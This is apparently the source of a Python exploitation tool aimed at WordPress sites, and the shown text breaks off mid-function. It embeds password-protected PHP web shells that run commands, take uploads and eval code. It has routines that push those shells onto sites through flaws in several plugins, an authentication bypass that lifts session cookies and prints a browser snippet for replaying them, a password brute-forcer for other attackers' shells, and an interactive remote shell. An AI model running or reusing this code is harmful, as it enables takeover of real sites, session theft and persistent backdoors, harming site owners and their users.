import requests
import re
import time
import os
import sys
import json
import random
import string
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
import threading
import zipfile
import tempfile
import argparse

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
PINK = "\033[95m"
GREY = "\033[90m"
BOLD = "\033[1m"
RESET = "\033[0m"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

JUDOL_KEYWORDS = [
    'slot', 'gacor', 'deposit', 'bonus', 'jackpot', 'rtp', 'pragmatic', 
    'pg soft', 'togel', 'casino', 'zeus', 'olympus', 'maxwin', 'scatter',
    'mahjong', 'ways', 'wild', 'bet', 'judi', 'bola', 'poker', 'situs'
]

SHELL_REGEX_PATTERNS = [
    r'uid=\d+\(.*\)',
    r'gid=\d+\(.*\)',
    r'Current Dir:',
    r'File Manager',
    r'Upload File',
    r'Execute Command',
    r'wso_ver',
    r'b374k',
    r'IndoXploit',
    r'WSO\s*[\d\.]+',
    r'Shell\s*v\d+',
    r'C99Shell',
    r'R57Shell',
    r'ALFA\s*TEaM',
    r'Leaf\s*Mailer',
    r'Mau\s*Upload\s*Apa',
    r'Uname:',
    r'multipart/form-data',
    r'type="file"',
    r'name="cmd"',
    r'eval\(base64_decode',
    r'FilesMan',
    r'WebShell',
    r'Mini\s*Shell',
    r'Priv8',
    r'Angel\s*Shell',
    r'g6\s*shell',
    r'h4x0r',
    r'input\s*name\s*=\s*["\']?cmd["\']?',
    r'input\s*name\s*=\s*["\']?pass["\']?',
    r'type\s*=\s*["\']?submit["\']?',
    r'value\s*=\s*["\']?execute["\']?',
    r'Symlink',
    r'Zone-H',
    r'linux',
    r'windows',
    r'drwxr',
    r'Safe_mode',
    r'Disable_functions',
    r'Open_basedir',
    r'php_uname',
    r'posix_getpwuid',
    r'disk_total_space'
]

SHELL_TITLE_REGEX = [
    r'WSO', r'Shell', r'b374k', r'IndoXploit', r'File Manager', r'Priv8', 
    r'Mini Shell', r'MadSpot', r'C99', r'R57', r'Remot', r'Hacked', 
    r'Defaced', r'Upload', r'Bypass', r'Root', r'Command', r'Backdoor',
    r'Mailer', r'0x', r'pwn', r'Admin', r'Dashboard'
]

WP_VULN_PLUGINS = [
    {'name': 'wp-file-manager', 'path': 'wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php', 'keywords': ['errUnknownCmd', 'json', 'currentFolder']},
    {'name': 'wp-file-manager-old', 'path': 'wp-content/plugins/wp-file-manager/lib/php/connector.php', 'keywords': ['errUnknownCmd', 'json', 'currentFolder']},
    {'name': 'ajax-search-pro', 'path': 'wp-content/plugins/ajax-search-pro/js/file_upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'revslider', 'path': 'wp-content/plugins/revslider/temp/update_extract/revslider/update.php', 'keywords': ['revslider', 'update', 'failed']},
    {'name': 'elementor', 'path': 'wp-content/plugins/elementor/core/app/modules/onboarding/module.php', 'keywords': ['elementor_upload_and_install_pro', 'nonce', 'ajax']},
    {'name': 'woocommerce', 'path': 'wp-admin/admin-ajax.php', 'keywords': ['wc_upload_file_ajax', 'action', 'file']},
    {'name': 'mpmf', 'path': 'wp-content/plugins/multi-purpose-multi-forms/mpmf-1/', 'keywords': ['mpmf_form_id', 'form_name', 'custom_form_action']},
    {'name': 'pix-for-woocommerce', 'path': 'wp-content/plugins/payment-gateway-pix-for-woocommerce/Includes/files/certs_c6/', 'keywords': ['lkn_pix_for_woocommerce_generate_nonce', 'nonce']},
    {'name': 'kivicare', 'path': 'wp-json/kivicare/v1/', 'keywords': ['social-login', 'kivicare', 'auth']},
]

# Actual PHP Shell Code
SHELL_PASSWORD = "aezeron"
ACTUAL_PHP_SHELL = f"""<?php
/**
 * Aezeron Web Shell
 * Password protected shell for authorized access only
 */

$pass = "{SHELL_PASSWORD}";

// Password protection
if(!isset($_REQUEST['p']) || $_REQUEST['p'] !== $pass) {{
    die("Access Denied - Invalid Password");
}}

// Command execution
if(isset($_REQUEST['cmd'])) {{
    echo "<pre style='background:#000;color:#0f0;padding:10px;'>";
    echo "Command: " . htmlspecialchars($_REQUEST['cmd']) . "\\n";
    echo "Output:\\n";
    echo "=" . str_repeat("=", 50) . "\\n";
    system($_REQUEST['cmd']);
    echo "\\n" . "=" . str_repeat("=", 50) . "\\n";
    echo "</pre>";
    die;
}}

// File upload
if(isset($_FILES['f'])) {{
    $target = $_FILES['f']['name'];
    if(move_uploaded_file($_FILES['f']['tmp_name'], $target)) {{
        echo "File uploaded successfully: " . htmlspecialchars($target);
    }} else {{
        echo "Upload failed!";
    }}
    die;
}}

// Code execution via POST
if(isset($_POST['code'])) {{
    eval($_POST['code']);
    die;
}}

// File manager
if(isset($_GET['file'])) {{
    $file = $_GET['file'];
    if(file_exists($file)) {{
        header('Content-Type: text/plain');
        readfile($file);
    }} else {{
        echo "File not found: " . htmlspecialchars($file);
    }}
    die;
}}

// Directory listing
if(isset($_GET['dir'])) {{
    $dir = $_GET['dir'];
    if(is_dir($dir)) {{
        $files = scandir($dir);
        echo "<pre>";
        foreach($files as $file) {{
            echo htmlspecialchars($file) . "\\n";
        }}
        echo "</pre>";
    }} else {{
        echo "Directory not found: " . htmlspecialchars($dir);
    }}
    die;
}}

// System info
if(isset($_GET['info'])) {{
    echo "PHP Version: " . phpversion() . "\\n";
    echo "Server OS: " . PHP_OS . "\\n";
    echo "User: " . get_current_user() . "\\n";
    echo "CWD: " . getcwd() . "\\n";
    die;
}}

echo "<!DOCTYPE html>
<html>
<head>
    <title>Aezeron Web Shell</title>
    <style>
        body {{ background: #1a1a1a; color: #0f0; font-family: monospace; padding: 20px; }}
        input, textarea {{ background: #2a2a2a; color: #0f0; border: 1px solid #0f0; padding: 5px; margin: 5px; }}
        input[type=submit] {{ background: #0f0; color: #000; cursor: pointer; }}
        .section {{ border: 1px solid #0f0; margin: 10px 0; padding: 10px; }}
        h2 {{ color: #0f0; margin: 0 0 10px 0; }}
    </style>
</head>
<body>
    <h1>Aezeron Web Shell</h1>
    <div class='section'>
        <h2>Command Execution</h2>
        <form method='get'>
            <input type='hidden' name='p' value='{SHELL_PASSWORD}'>
            <input type='text' name='cmd' size='60' placeholder='Enter command...'>
            <input type='submit' value='Execute'>
        </form>
    </div>
    <div class='section'>
        <h2>File Upload</h2>
        <form method='post' enctype='multipart/form-data'>
            <input type='hidden' name='p' value='{SHELL_PASSWORD}'>
            <input type='file' name='f'>
            <input type='submit' value='Upload'>
        </form>
    </div>
    <div class='section'>
        <h2>PHP Code Execution</h2>
        <form method='post'>
            <input type='hidden' name='p' value='{SHELL_PASSWORD}'>
            <textarea name='code' rows='5' cols='60' placeholder='Enter PHP code...'></textarea><br>
            <input type='submit' value='Execute'>
        </form>
    </div>
    <div class='section'>
        <h2>File Viewer</h2>
        <form method='get'>
            <input type='hidden' name='p' value='{SHELL_PASSWORD}'>
            <input type='text' name='file' size='60' placeholder='/etc/passwd or path/to/file'>
            <input type='submit' value='View'>
        </form>
    </div>
    <div class='section'>
        <h2>Directory Listing</h2>
        <form method='get'>
            <input type='hidden' name='p' value='{SHELL_PASSWORD}'>
            <input type='text' name='dir' size='60' placeholder='/var/www/html'>
            <input type='submit' value='List'>
        </form>
    </div>
</body>
</html>";
?>"""

# Simpler shell for uploads
SIMPLE_SHELL = f"""<?php
$p = "{SHELL_PASSWORD}";
if(isset($_REQUEST['p']) && $_REQUEST['p']===$p){{
    if(isset($_REQUEST['cmd'])){{ system($_REQUEST['cmd']); die; }}
    if(isset($_FILES['f'])){{ move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']); die; }}
    if(isset($_POST['code'])){{ eval($_POST['code']); die; }}
}}
echo "Aezeron Shell - Password required";
?>"""

# Simple shell for Pix for WooCommerce
PIX_SHELL = b"""<?php
$p = "aezeron";
if(isset($_REQUEST['p']) && $_REQUEST['p']===$p){
    if(isset($_REQUEST['cmd'])){ echo shell_exec($_REQUEST['cmd']); die; }
    if(isset($_FILES['f'])){ move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']); die; }
    if(isset($_POST['code'])){ eval($_POST['code']); die; }
}
echo "Pix Shell - Password required";
?>"""

class WPFileManagerExploit:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        self.cookies = {'wordpress_test_cookie': 'WP+Cookie+check'}
        self.logged_in = False

    def _random_ip(self):
        return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

    def is_shell(self, content):
        if not content:
            return False
        if SHELL_PASSWORD in content and ("Aezeron" in content or "system" in content):
            return True
        for pattern in SHELL_REGEX_PATTERNS:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        return False

    def verify_shell(self, url):
        try:
            resp = self.session.get(url, timeout=10, allow_redirects=True)
            if resp.status_code != 200 or 'wp-login.php' in resp.url:
                return False

            content = resp.text
            content_lower = content.lower()

            if not content.strip() or len(content) < 50:
                return False
            
            negative_keywords = [
                '404 not found', 'page not found', 'error 404', 'forbidden', 
                'access denied', 'internal server error', 'user_login', 'user_pass', 
                'wp-submit', 'loginform'
            ]
            negative_keywords.extend(JUDOL_KEYWORDS)
            if any(x in content_lower for x in negative_keywords):
                return False

            check_url = f"{url}?p={SHELL_PASSWORD}"
            try:
                resp_pass = self.session.get(check_url, timeout=5)
                if resp_pass.status_code == 200:
                    if "Aezeron" in resp_pass.text or "Aezeron Web Shell" in resp_pass.text:
                        return True
                    if "Command:" in resp_pass.text and "system" in resp_pass.text.lower():
                        return True
            except:
                pass

            test_cmd_url = f"{url}?p={SHELL_PASSWORD}&cmd=echo%20test"
            try:
                resp_cmd = self.session.get(test_cmd_url, timeout=5)
                if resp_cmd.status_code == 200 and "test" in resp_cmd.text:
                    return True
            except:
                pass

            has_shell_title = False
            title_match = re.search(r'<title>(.*?)</title>', content, re.IGNORECASE)
            if title_match:
                title = title_match.group(1).strip()
                for pattern in SHELL_TITLE_REGEX:
                    if re.search(pattern, title, re.IGNORECASE):
                        has_shell_title = True
                        break
            
            content_pattern_score = 0
            for pattern in SHELL_REGEX_PATTERNS:
                if re.search(pattern, content, re.IGNORECASE):
                    content_pattern_score += 1

            if has_shell_title or content_pattern_score >= 3:
                return True

            return False
        except:
            return False
    
    def brute_force_shell(self, url):
        passwords = [
            'admin', 'pass', 'password', '123456', 'root', 'toor', 'qwerty', 
            'indoxploit', 'b374k', 'ganteng', '123', '1', 'a', 'admin123', 
            'aezeron', 'leaf', 'blue', 'hacker'
        ]
        params = ['p', 'pass', 'password', 'pw', 'key', 'code', 'cmd']
        
        try:
            for pwd in passwords:
                for param in params:
                    try:
                        check_url = f"{url}?{param}={pwd}"
                        resp = self.session.get(check_url, timeout=3)
                        if resp.status_code == 200 and any(x in resp.text for x in ['Current Dir:', 'File Manager', 'Upload File', 'uid=']) and 'type="password"' not in resp.text:
                            return pwd, param
                        
                        resp = self.session.post(url, data={param: pwd}, timeout=3)
                        if resp.status_code == 200 and any(x in resp.text for x in ['Current Dir:', 'File Manager', 'Upload File', 'uid=']) and 'type="password"' not in resp.text:
                            return pwd, param
                    except:
                        continue
        except:
            pass
        return None, None

    def exploit_index_of(self, url):
        try:
            shell_name = f"sh_{random.randint(1000,9999)}.php"
            
            headers = {'User-Agent': 'Mozilla/5.0'}
            resp = self.session.put(urljoin(url, shell_name), data=SIMPLE_SHELL, headers=headers, timeout=10)
            if resp.status_code in [200, 201, 204]:
                if self.verify_shell(urljoin(url, shell_name)):
                    return True, urljoin(url, shell_name)
            
            files = {'file': (shell_name, SIMPLE_SHELL, 'application/x-php')}
            resp = self.session.post(url, files=files, timeout=10)
            if resp.status_code == 200:
                 if self.verify_shell(urljoin(url, shell_name)):
                    return True, urljoin(url, shell_name)
        except:
            pass
        return False, None
    
    def detect_mpmf_endpoint_and_form(self, target_url):
        """
        Detect MPMF endpoint and form name automatically
        Returns (endpoint_url, form_name)
        """
        print(f"    {CYAN}[*]{RESET} Auto-detecting MPMF endpoint and form name...")
        
        base_url = target_url.rstrip('/')
        
        # Common MPMF endpoint patterns
        endpoint_patterns = [
            '/mpmf-1/',
            '/mpmf/',
            '/multi-purpose-multi-forms/',
            '/wp-content/plugins/multi-purpose-multi-forms/mpmf-1/',
            '/index.php/mpmf-1/',
        ]
        
        # Common form name patterns
        form_patterns = [
            r'name="form_name"\s+value="([^"]+)"',
            r'form_name["\']\s*:\s*["\']([^"\']+)',
            r'form_id["\']\s*:\s*["\']([^"\']+)',
            r'mpmf_form_id["\']\s*:\s*["\']([^"\']+)',
            r'<input[^>]+name="form_name"[^>]+value="([^"]+)"',
        ]
        
        found_endpoint = None
        found_form_name = None
        
        # Try to find endpoint by checking common paths
        for pattern in endpoint_patterns:
            test_url = urljoin(base_url, pattern)
            try:
                resp = self.session.get(test_url, timeout=5)
                if resp.status_code == 200:
                    # Check if this looks like an MPMF form
                    if 'mpmf' in resp.text.lower() or 'form_name' in resp.text:
                        found_endpoint = test_url
                        print(f"    {GREEN}[+]{RESET} Found MPMF endpoint: {found_endpoint}")
                        break
            except:
                continue
        
        # If no endpoint found, try to find any page with MPMF indicators
        if not found_endpoint:
            # Try to find MPMF forms on the main page or common pages
            pages_to_check = [
                base_url,
                urljoin(base_url, '/'),
                urljoin(base_url, '/index.php'),
                urljoin(base_url, '/wp-content/plugins/multi-purpose-multi-forms/'),
            ]
            
            for page in pages_to_check:
                try:
                    resp = self.session.get(page, timeout=5)
                    if resp.status_code == 200 and 'mpmf' in resp.text.lower():
                        # Look for form action URL
                        action_match = re.search(r'<form[^>]+action="([^"]+)"', resp.text)
                        if action_match:
                            found_endpoint = action_match.group(1)
                            print(f"    {GREEN}[+]{RESET} Found MPMF endpoint from form action: {found_endpoint}")
                            break
                except:
                    continue
        
        # Now detect form name
        if found_endpoint:
            try:
                resp = self.session.get(found_endpoint, timeout=5)
                if resp.status_code == 200:
                    for pattern in form_patterns:
                        match = re.search(pattern, resp.text, re.IGNORECASE)
                        if match:
                            found_form_name = match.group(1)
                            print(f"    {GREEN}[+]{RESET} Detected form_name: {found_form_name}")
                            break
            except:
                pass
        
        # If still no form name, try common values
        if not found_form_name:
            common_forms = ['hkh', 'contact', 'form1', 'mpmf_form', 'upload', 'default', 'mpmf']
            for fname in common_forms:
                if found_endpoint:
                    test_url = f"{found_endpoint}?form_name={fname}"
                    try:
                        resp = self.session.get(test_url, timeout=5)
                        if resp.status_code == 200 and ('mpmf' in resp.text.lower() or len(resp.text) > 100):
                            found_form_name = fname
                            print(f"    {GREEN}[+]{RESET} Found working form name: {found_form_name}")
                            break
                    except:
                        continue
        
        return found_endpoint, found_form_name
    
    def exploit_kivicare_auth_bypass(self, target_url, email, login_type="google"):
        """
        CVE-2026-2991 — KiviCare Clinic & Patient Management System Authentication Bypass
        Author: Joshua van der Poll
        """
        print(f"\n  {CYAN}[*]{RESET} Testing KiviCare Auth Bypass (CVE-2026-2991)...")
        
        base_url = target_url.rstrip("/")
        endpoint = "/wp-json/kivicare/v1/auth/patient/social-login"
        fake_token = "A" * 40  # Fake OAuth token
        
        # Check if KiviCare is installed
        try:
            check_resp = self.session.get(f"{base_url}/wp-json/kivicare/v1/", timeout=5)
            if check_resp.status_code >= 500:
                print(f"    {RED}[-]{RESET} KiviCare plugin not detected or not active")
                return False, "KiviCare not detected"
        except:
            print(f"    {RED}[-]{RESET} Could not detect KiviCare plugin")
            return False, "KiviCare not detected"
        
        print(f"    {CYAN}[*]{RESET} Target email: {email}")
        print(f"    {CYAN}[*]{RESET} Login type: {login_type}")
        
        payload = {
            "email": email,
            "login_type": login_type,
            "password": fake_token,
        }
        
        try:
            print(f"    {CYAN}[*]{RESET} Sending social login request...")
            response = self.session.post(
                f"{base_url}{endpoint}",
                json=payload,
                timeout=10,
                allow_redirects=False,
            )
            
            print(f"    {CYAN}[*]{RESET} HTTP {response.status_code}")
            
            if response.status_code == 200:
                try:
                    body = response.json()
                    data = body.get("data", body)
                    
                    if "user_id" in data:
                        print(f"    {GREEN}[+]{RESET} Authentication bypass successful!")
                        print(f"    {CYAN}[*]{RESET} User ID: {data.get('user_id')}")
                        print(f"    {CYAN}[*]{RESET} Username: {data.get('username', 'N/A')}")
                        print(f"    {CYAN}[*]{RESET} Display Name: {data.get('display_name', 'N/A')}")
                        print(f"    {CYAN}[*]{RESET} Email: {data.get('user_email', 'N/A')}")
                        print(f"    {CYAN}[*]{RESET} Roles: {', '.join(data.get('roles', []))}")
                        
                        # Show cookies
                        cookies = {c.name: c.value for c in response.cookies}
                        if cookies:
                            print(f"    {GREEN}[+]{RESET} Auth cookies obtained!")
                            for name, value in cookies.items():
                                print(f"        {YELLOW}{name}{RESET} = {value[:50]}...")
                            
                            # Generate console snippet
                            print(f"\n    {YELLOW}[!]{RESET} Browser console snippet:")
                            print(f"    {GREY}// Paste in browser console on {base_url}{RESET}")
                            for name, value in cookies.items():
                                print(f"    document.cookie = \"{name}={value}; path=/\";")
                            if data.get("redirect_url"):
                                print(f"    window.location.href = \"{data['redirect_url']}\";")
                        
                        return True, f"KiviCare bypass: Logged in as {data.get('user_email', email)}"
                    else:
                        print(f"    {YELLOW}[!]{RESET} No user_id in response")
                        return False, "No user data returned"
                        
                except Exception as e:
                    print(f"    {RED}[-]{RESET} Error parsing response: {str(e)}")
                    return False, f"Parse error: {str(e)}"
                    
            elif response.status_code == 403:
                print(f"    {YELLOW}[!]{RESET} 403 Forbidden - Account exists but may not be a patient")
                cookies = {c.name: c.value for c in response.cookies}
                if cookies:
                    print(f"    {GREEN}[+]{RESET} Auth cookies still issued! Session is replayable.")
                    for name, value in cookies.items():
                        print(f"        {YELLOW}{name}{RESET} = {value[:50]}...")
                return True, f"KiviCare partial bypass: Cookies obtained for {email}"
                
            elif response.status_code == 400:
                print(f"    {RED}[-]{RESET} Bad request - Email may not be registered")
                return False, "Email not registered"
                
            else:
                print(f"    {RED}[-]{RESET} Unexpected response: {response.status_code}")
                return False, f"HTTP {response.status_code}"
                
        except Exception as e:
            print(f"    {RED}[-]{RESET} KiviCare exploit error: {str(e)}")
            return False, f"Error: {str(e)}"
    
    def exploit_pix_woocommerce_rce(self, target_url, command=None, interactive=False):
        """
        CVE-2026-3891 — Pix for WooCommerce <= 1.5.0 - Unauthenticated Arbitrary File Upload
        Author: Joshua van der Poll
        """
        print(f"\n  {CYAN}[*]{RESET} Testing Pix for WooCommerce RCE (CVE-2026-3891)...")
        
        base_url = target_url.rstrip("/")
        shell_name = "shell.php"
        shell_path = f"wp-content/plugins/payment-gateway-pix-for-woocommerce/Includes/files/certs_c6/{shell_name}"
        shell_url = f"{base_url}/{shell_path}"
        
        try:
            # Step 1: Get nonce
            print(f"    {CYAN}[*]{RESET} Fetching nonce...")
            nonce_response = self.session.post(
                f"{base_url}/wp-admin/admin-ajax.php",
                data={
                    "action": "lkn_pix_for_woocommerce_generate_nonce",
                    "action_name": "lkn_pix_for_woocommerce_c6_settings_nonce",
                },
                timeout=10,
            )
            
            try:
                nonce_data = nonce_response.json()
                if not nonce_data.get("success"):
                    print(f"    {RED}[-]{RESET} Nonce request failed: {nonce_data}")
                    return False, "Failed to get nonce"
                nonce = nonce_data["data"]["nonce"]
                print(f"    {GREEN}[+]{RESET} Nonce obtained: {nonce}")
            except Exception as e:
                print(f"    {RED}[-]{RESET} Failed to parse nonce response: {str(e)}")
                return False, f"Nonce error: {str(e)}"
            
            # Step 2: Upload shell
            print(f"    {CYAN}[*]{RESET} Uploading shell...")
            
            with tempfile.NamedTemporaryFile(suffix=".php", delete=False) as tmp:
                tmp.write(PIX_SHELL)
                tmp_path = tmp.name
            
            try:
                data = {
                    "action": "lkn_pix_for_woocommerce_c6_save_settings",
                    "_ajax_nonce": nonce,
                    "settings": json.dumps({"enabled": "yes", "title": "PIX C6", "pix_expiration_minutes": 30}),
                }
                
                with open(tmp_path, "rb") as f:
                    files = {
                        "certificate_crt_path": (shell_name, f, "application/octet-stream"),
                    }
                    
                    upload_response = self.session.post(
                        f"{base_url}/wp-admin/admin-ajax.php",
                        data=data,
                        files=files,
                        timeout=30,
                    )
                
                try:
                    upload_data = upload_response.json()
                    if not upload_data.get("success"):
                        print(f"    {RED}[-]{RESET} Upload failed: {upload_data}")
                        return False, "Upload failed"
                except:
                    pass
                
                print(f"    {GREEN}[+]{RESET} Shell uploaded successfully!")
                print(f"    {CYAN}[*]{RESET} Shell URL: {shell_url}")
                print(f"    {YELLOW}[!]{RESET} Password: {SHELL_PASSWORD}")
                
            finally:
                os.unlink(tmp_path)
            
            # Step 3: Verify shell
            print(f"    {CYAN}[*]{RESET} Verifying shell...")
            verify_response = self.session.get(shell_url, timeout=10)
            
            if verify_response.status_code == 200:
                print(f"    {GREEN}[+]{RESET} Shell is accessible!")
                
                test_response = self.session.get(f"{shell_url}?p={SHELL_PASSWORD}&cmd=echo%20test")
                if test_response.status_code == 200 and "test" in test_response.text:
                    print(f"    {GREEN}[SHELL]{RESET} Pix shell active: {shell_url}?p={SHELL_PASSWORD}")
                    
                    if command:
                        print(f"    {CYAN}[*]{RESET} Running command: {command}")
                        cmd_response = self.session.get(f"{shell_url}?p={SHELL_PASSWORD}&cmd={command}", timeout=10)
                        if cmd_response.status_code == 200 and cmd_response.text.strip():
                            print(f"\n    {GREEN}[OUTPUT]{RESET}\n{cmd_response.text.strip()}\n")
                    
                    if interactive:
                        self.interactive_pix_shell(shell_url)
                    
                    return True, f"Pix Shell: {shell_url}?p={SHELL_PASSWORD}"
                else:
                    print(f"    {YELLOW}[!]{RESET} Shell uploaded but command execution failed")
                    return True, f"Pix payload uploaded: {shell_url}?p={SHELL_PASSWORD}"
            else:
                print(f"    {RED}[-]{RESET} Shell not accessible (HTTP {verify_response.status_code})")
                return False, "Shell upload failed verification"
                
        except Exception as e:
            print(f"    {RED}[-]{RESET} Pix exploit error: {str(e)}")
            return False, f"Error: {str(e)}"
    
    def interactive_pix_shell(self, shell_url):
        """Interactive shell for Pix for WooCommerce"""
        print(f"\n  {GREEN}[+]{RESET} Entering interactive shell mode...")
        print(f"  {YELLOW}[!]{RESET} Type 'exit' or Ctrl+C to quit\n")
        
        try:
            while True:
                cmd = input(f"  {PINK}shell>{RESET} ").strip()
                if not cmd:
                    continue
                if cmd.lower() in ('exit', 'quit'):
                    break
                
                try:
                    response = self.session.get(f"{shell_url}?p={SHELL_PASSWORD}&cmd={cmd}", timeout=10)
                    if response.status_code == 200 and response.text.strip():
                        print(response.text.strip())
                    else:
                        print(f"  {YELLOW}[!]{RESET} No output or command failed")
                except Exception as e:
                    print(f"  {RED}[-]{RESET} Error: {str(e)}")
        except KeyboardInterrupt:
            print(f"\n  {YELLOW}[!]{RESET} Exiting interactive shell")
    
    def exploit_mpmf_rce(self, target_url, form_name=None):
        """
        CVE-2024-50526: Multi-Purpose Multi-Forms (mpmf) Unauthenticated RCE
        """
        print(f"\n  {CYAN}[*]{RESET} Testing MPMF RCE (CVE-2024-50526)...")
        
        # Auto-detect endpoint and form name if not provided
        endpoint_url = None
        if not form_name:
            endpoint_url, detected_form = self.detect_mpmf_endpoint_and_form(target_url)
            if detected_form:
                form_name = detected_form
        
        # If still no endpoint, try common paths
        if not endpoint_url:
            base_url = target_url.rstrip('/')
            common_endpoints = [
                urljoin(base_url, '/mpmf-1/'),
                urljoin(base_url, '/mpmf/'),
                urljoin(base_url, '/index.php/mpmf-1/'),
                urljoin(base_url, '/wp-content/plugins/multi-purpose-multi-forms/mpmf-1/'),
            ]
            for ep in common_endpoints:
                try:
                    resp = self.session.get(ep, timeout=5)
                    if resp.status_code == 200:
                        endpoint_url = ep
                        print(f"    {GREEN}[+]{RESET} Found MPMF endpoint: {endpoint_url}")
                        break
                except:
                    continue
        
        if not endpoint_url:
            print(f"    {RED}[-]{RESET} Could not find MPMF endpoint")
            return False, "MPMF endpoint not found"
        
        # If still no form name, try to detect from endpoint
        if not form_name:
            try:
                resp = self.session.get(endpoint_url, timeout=5)
                if resp.status_code == 200:
                    form_patterns = [
                        r'name="form_name"\s+value="([^"]+)"',
                        r'form_name["\']\s*:\s*["\']([^"\']+)',
                        r'<input[^>]+name="form_name"[^>]+value="([^"]+)"',
                    ]
                    for pattern in form_patterns:
                        match = re.search(pattern, resp.text, re.IGNORECASE)
                        if match:
                            form_name = match.group(1)
                            print(f"    {GREEN}[+]{RESET} Detected form_name: {form_name}")
                            break
            except:
                pass
        
        # Last resort: try common form names
        if not form_name:
            common_forms = ['hkh', 'contact', 'form1', 'mpmf_form', 'upload', 'default']
            for fname in common_forms:
                print(f"    {CYAN}[*]{RESET} Trying form name: {fname}")
                # Test if this form name works by checking if the page loads
                test_url = f"{endpoint_url}?form_name={fname}"
                try:
                    resp = self.session.get(test_url, timeout=5)
                    if resp.status_code == 200 and ('mpmf' in resp.text.lower() or len(resp.text) > 100):
                        form_name = fname
                        print(f"    {GREEN}[+]{RESET} Found working form name: {form_name}")
                        break
                except:
                    continue
        
        if not form_name:
            print(f"    {RED}[-]{RESET} Could not detect form_name")
            return False, "Form name not detected"
        
        print(f"    {CYAN}[*]{RESET} Endpoint: {endpoint_url}")
        print(f"    {CYAN}[*]{RESET} Form name: {form_name}")
        
        php_payload = f"""<?php
$p = "{SHELL_PASSWORD}";
if(isset($_REQUEST['p']) && $_REQUEST['p']===$p){{
    if(isset($_REQUEST['cmd'])){{ system($_REQUEST['cmd']); die; }}
    if(isset($_FILES['f'])){{ move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']); die; }}
    if(isset($_POST['code'])){{ eval($_POST['code']); die; }}
}}
if (php_sapi_name() !== 'cli' && !isset($_GET['cmd'])) {{
    echo 'System OS: ' . php_uname('s');
}}
if (isset($_GET['cmd'])) {{
    system($_GET['cmd']);
}}
?>"""
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Origin": target_url.rstrip('/'),
            "DNT": "1",
            "Sec-GPC": "1",
            "Connection": "keep-alive",
            "Referer": endpoint_url,
            "Upgrade-Insecure-Requests": "1",
        }
        
        files = {
            "file1": ("cmd.php", php_payload, "application/octet-stream"),
        }
        
        data = {
            "form_name": form_name,
            "field_label1": "",
            "countcalculated": "1",
            "count_files": "1",
            "count": "2",
            "mpmf_form_id": "1",
            "custom_form_action": "send_data",
            "send": "Submit",
        }
        
        try:
            print(f"    {CYAN}[*]{RESET} Uploading payload to {endpoint_url}")
            response = self.session.post(endpoint_url, headers=headers, files=files, data=data, timeout=30)
            
            if response.status_code == 200:
                print(f"    {GREEN}[+]{RESET} File upload successful!")
                
                # Determine base URL for uploads
                base_parts = target_url.split('/wp-content/')
                if len(base_parts) > 1:
                    base_url = base_parts[0] + '/'
                else:
                    base_url = target_url.rstrip('/') + '/'
                
                shell_url = f"{base_url}wp-content/uploads/mpmf_uploads/cmd.php"
                print(f"    {CYAN}[*]{RESET} Checking for shell at: {shell_url}")
                
                time.sleep(2)
                
                if self.verify_shell(shell_url):
                    print(f"    {GREEN}[SHELL]{RESET} MPMF shell active: {shell_url}?p={SHELL_PASSWORD}")
                    return True, f"MPMF Shell: {shell_url}?p={SHELL_PASSWORD}"
                else:
                    alt_paths = [
                        f"{base_url}wp-content/uploads/cmd.php",
                        f"{base_url}wp-content/uploads/mpmf/cmd.php",
                        f"{base_url}uploads/mpmf_uploads/cmd.php",
                        f"{base_url}wp-content/plugins/multi-purpose-multi-forms/files/cmd.php",
                    ]
                    for alt_url in alt_paths:
                        if self.verify_shell(alt_url):
                            print(f"    {GREEN}[SHELL]{RESET} MPMF shell found: {alt_url}?p={SHELL_PASSWORD}")
                            return True, f"MPMF Shell: {alt_url}?p={SHELL_PASSWORD}"
                    
                    print(f"    {YELLOW}[!]{RESET} Payload uploaded but shell verification failed")
                    print(f"    {YELLOW}[!]{RESET} Try accessing: {shell_url}?p={SHELL_PASSWORD}")
                    return True, f"MPMF payload uploaded: {shell_url}?p={SHELL_PASSWORD}"
            else:
                print(f"    {RED}[-]{RESET} Upload failed with status {response.status_code}")
                return False, f"Upload failed with status {response.status_code}"
                
        except Exception as e:
            print(f"    {RED}[-]{RESET} MPMF exploit error: {str(e)}")
            return False, f"Error: {str(e)}"
    
    def exploit_woocommerce_rce(self, target_url):
        """
        CVE-2024-51793: WooCommerce Unauthenticated RCE via admin-ajax.php
        """
        print(f"\n  {CYAN}[*]{RESET} Testing WooCommerce RCE (CVE-2024-51793)...")
        
        ajax_url = urljoin(target_url, 'wp-admin/admin-ajax.php')
        shell_name = f"woo_{random.randint(1000, 9999)}.php"
        
        php_payload = f"""<?php
$p = "{SHELL_PASSWORD}";
if(isset($_REQUEST['p']) && $_REQUEST['p']===$p){{
    if(isset($_REQUEST['cmd'])){{ system($_REQUEST['cmd']); die; }}
    if(isset($_FILES['f'])){{ move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']); die; }}
    if(isset($_POST['code'])){{ eval($_POST['code']); die; }}
}}
if (php_sapi_name() !== 'cli' && !isset($_GET['cmd'])) {{
    echo 'System OS: ' . php_uname('s');
}}
if (isset($_GET['cmd'])) {{
